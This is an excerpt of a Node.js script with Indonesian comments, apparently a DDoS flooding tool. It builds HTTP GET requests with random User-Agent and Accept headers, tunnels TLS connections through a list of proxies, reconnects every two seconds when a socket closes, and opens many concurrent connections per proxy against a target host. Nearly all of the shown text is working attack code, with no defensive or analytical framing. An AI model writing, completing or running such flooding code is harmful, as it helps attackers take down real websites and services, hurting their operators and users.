...
const PAYLOAD_TEMPLATE = (host) =>
    `GET / HTTP/1.1\r\n` +
    `Host: ${host}\r\n` +
    `User-Agent: ${useragents[Math.floor(Math.random() * useragents.length)]}\r\n` +
    `${acceptall[Math.floor(Math.random() * acceptall.length)]}` +
    `Connection: keep-alive\r\n` +
    `\r\n`;

function sendPayload(socket, targetHost) {
    if (socket.destroyed) return;
    socket.write(PAYLOAD_TEMPLATE(targetHost));
}
...
function setupTLS(socket, targetHost) {
    ...
    tlsSocket.on('error', () => {
        // Socket akan dihancurkan dari luar
    });
...
// ==================== STABLE RECONNECT POOL ====================
function startStableConnection(protocol, proxyIp, proxyPort) {
    const RECONNECT_DELAY = 2000; // 2 detik sebelum reconnect
    ...
    function tryConnect() {
        ...
        connectFn(proxyIp, proxyPort, (tlsSocket) => {
            // Koneksi sukses, pasang listener 'close' untuk reconnect
            tlsSocket.on('close', () => {
                setTimeout(tryConnect, RECONNECT_DELAY);
            });
            tlsSocket.on('error', () => {
                // socket akan di-destroy dan trigger close
            });
        }, () => {
            // Gagal konek, coba lagi nanti
            setTimeout(tryConnect, RECONNECT_DELAY);
        });
    }
...
function main() {
    ...
    for (let i = 0; i < lines.length; i++) {
        ...
        // Bikin CONCURRENT koneksi stabil per proxy
